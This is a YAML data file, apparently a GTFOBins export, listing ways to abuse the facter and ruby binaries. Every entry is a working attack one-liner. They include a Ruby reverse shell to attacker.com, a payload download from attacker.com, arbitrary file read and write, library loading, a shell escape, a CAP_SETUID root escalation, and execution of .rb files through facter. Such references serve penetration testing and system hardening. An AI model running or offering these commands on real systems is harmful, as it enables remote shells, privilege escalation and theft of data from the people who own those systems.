source_data:
  GTFOBins:
    raw:
      documents:
        facter:
          functions:
            inherit:
            - code: FACTERLIB=/path/to/dir/ facter
              comment: The first `.rb` file in the `/path/to/dir/` directory will be executed.
              contexts:
                sudo: null
                unprivileged: null
              from: ruby
            - code: facter --custom-dir=/path/to/dir/ x
              comment: The first `.rb` file in the `/path/to/dir/` directory will be executed.
              contexts:
                sudo: null
                unprivileged: null
              from: ruby
        ruby:
          functions:
            download:
            - code: ruby -e 'require "open-uri"; download = URI.open("http://attacker.com/path/to/input-file");
                IO.copy_stream(download, "/path/to/output-file")'
              contexts:
                sudo: null
                unprivileged: null
              sender: http-server
            file-read:
            - code: ruby -e 'puts File.read("/path/to/input-file")'
              contexts:
                sudo: null
                unprivileged: null
            file-write:
            - code: ruby -e 'File.open("/path/to/output-file", "w+") { |f| f.write("DATA") }'
              contexts:
                sudo: null
                unprivileged: null
            library-load:
            - code: ruby -e 'require "fiddle"; Fiddle.dlopen("/path/to/lib.so")'
              contexts:
                sudo: null
                unprivileged: null
            reverse-shell:
            - code: ruby -rsocket -e 'exit if fork;c=TCPSocket.new("attacker.com",12345);while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print
                io.read}end'
              contexts:
                sudo: null
                unprivileged: null
              listener: tcp-server
            shell:
            - code: ruby -e 'exec "/bin/sh"'
              contexts:
                capabilities:
                  code: ruby -e 'Process::Sys.setuid(0); exec "/bin/sh"'
                  list:
                  - CAP_SETUID
                sudo: null
                unprivileged: null
            upload:
            - code: ruby -run -e httpd . -p 80
              contexts:
                sudo: null
                unprivileged: null
              receiver: http-client
              version: '>= 1.9.2'
